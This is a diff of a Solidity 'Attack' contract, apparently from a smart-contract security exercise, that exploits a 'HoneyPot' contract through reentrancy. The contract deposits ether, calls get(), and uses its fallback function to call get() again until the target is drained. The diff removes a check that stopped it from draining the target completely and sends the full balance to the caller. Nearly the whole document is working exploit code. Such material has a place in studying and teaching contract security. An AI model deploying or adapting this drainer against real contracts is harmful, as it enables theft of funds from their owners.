@@ -4,27 +4,19 @@ import "./HoneyPot.sol";
 
 contract Attack{
 
-    bool done;
-
     function initAttack(address _honeypot) public payable{
 
-        require(address(_honeypot).balance%msg.value == 0, "will not drain the contract");
-
+        require(msg.value > 0);
+        uint initialBalance = msg.value;
         HoneyPot(_honeypot).put.value(msg.value)();
         HoneyPot(_honeypot).get();
-
-        require(address(this).balance > 0);
-        
-        if(!done){
-            
-            done = true;
-            msg.sender.transfer(address(this).balance);
-        }
+        require(address(this).balance >= initialBalance);
+        msg.sender.transfer(address(this).balance);
     }
 
     function () public payable{
         
-        if(msg.sender.balance > 0 && gasleft() >= 3000000)
+        if(msg.sender.balance >= msg.value && gasleft() >= 3000000)
             HoneyPot(msg.sender).get();
     }
 }
